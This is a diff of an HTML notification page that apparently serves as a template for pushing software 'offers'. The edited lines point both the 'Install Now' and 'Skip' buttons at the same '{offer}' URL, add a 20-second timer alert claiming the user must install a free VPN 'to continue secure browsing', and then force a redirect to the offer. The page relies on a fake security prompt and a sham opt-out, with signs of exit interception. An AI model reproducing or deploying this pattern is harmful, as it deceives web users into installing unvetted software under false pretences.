@@ -6,12 +6,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Notification (1)</title>
     <meta name="description" content="Notification">
-    <meta name="author" content="OBAK">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.2/font/bootstrap-icons.css">
     <link href="modals.css" rel="stylesheet">
-    <!--<meta http-equiv="refresh" content="15; url=https://www.google.com"/> -->
     <style type="text/css">
         .modal-content {
             width: 85%;
@@ -37,8 +35,8 @@
                     <p></p>
                 </div>
                 <div class="modal-footer flex-column border-top-0">
-                    <a type="button" class="btn btn-lg btn-primary w-100 mx-0 mb-2" onclick="location.href = 'https://www.goole.com';">Install Now</a>
-                    <a type="button" class="btn btn-lg btn-light w-100 mx-0" onclick="location.href = 'https://www.goole.com';">Skip</a>
+                    <a type="button" class="btn btn-lg btn-primary w-100 mx-0 mb-2" onclick="location.href = '{offer}';">Install Now</a>
+                    <a type="button" class="btn btn-lg btn-light w-100 mx-0" onclick="location.href = '{offer}';">Skip</a>
                 </div>
             </div>
         </div>
@@ -47,7 +45,7 @@
     setTimeout(function() {
         alert("Install a free VPN to continue secure browsing");
         PreventExitPop = false;
-        window.location = "http://www.google.com"
+        window.location = "{offer}"
     }, 20000);
     </script>
 </body>
